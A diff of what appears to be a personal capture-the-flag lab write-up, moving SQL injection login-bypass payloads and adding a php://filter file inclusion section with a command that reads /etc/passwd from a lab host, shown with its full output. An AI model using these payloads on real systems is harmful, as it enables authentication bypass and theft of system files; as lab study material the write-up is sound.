@@ -141,26 +141,6 @@ http 10.10.184.121/login.php
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/6507c942-3c34-404e-8dd2-b3d599dac5f8/image.png)
 
-# sql inject
-
-' || 1=1;-- -
-' OR 'x'='x'#;
-
-username=%27+%7C%7C+1%3D1%3B--+-&password=1
-
-http://10.201.123.154/secret-script.php?file=supersecretadminpanel.html
-
-![](https://velog.velcdn.com/images/agnusdei1207/post/0aea22c6-84fb-485f-a9e0-3aedd94d214f/image.png)
-
-# directory traversal
-
-http://10.201.123.154/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
-http://10.201.123.154/secret-script.php?file=php://filter/resource=users.html
-
-![](https://velog.velcdn.com/images/agnusdei1207/post/f1b75c5b-17ef-432f-864f-be4badf39e18/image.png)
-
-http://10.201.123.154/secret-script.php
-
 # SQL injection
 
 ┌──(root㉿docker-desktop)-[/]
@@ -209,3 +189,77 @@ password [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 348ms]
   ' or ''-' [Status: 200, Size: 888, Words: 227, Lines: 29, Duration: 400ms]
 
 # All success
+
+# sql inject
+
+' || 1=1;-- -
+' OR 'x'='x'#;
+
+username=%27+%7C%7C+1%3D1%3B--+-&password=1
+
+http://10.201.123.154/secret-script.php?file=supersecretadminpanel.html
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/0aea22c6-84fb-485f-a9e0-3aedd94d214f/image.png)
+
+# directory traversal -> php filter -> file inclusion vulnerability
+
+http://10.201.123.154/secret-script.php?file=php://filter/resource=supersecretmessageforadmin
+http://10.201.123.154/secret-script.php?file=php://filter/resource=users.html
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/f1b75c5b-17ef-432f-864f-be4badf39e18/image.png)
+
+http://10.201.123.154/secret-script.php
+
+http://10.201.123.154/secret-script.php?file=php://filter/resource=/etc/passwd
+
+# /etc/password try it out!
+
+┌──(root㉿docker-desktop)-[/]
+└─# http http://10.201.123.154/secret-script.php?file=php://filter/resource=/etc/passwd
+HTTP/1.1 200 OK
+Connection: Keep-Alive
+Content-Encoding: gzip
+Content-Length: 739
+Content-Type: text/html; charset=UTF-8
+Date: Sun, 03 Aug 2025 13:25:39 GMT
+Keep-Alive: timeout=5, max=100
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+\_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+comte:x:1000:1000:comte:/home/comte:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
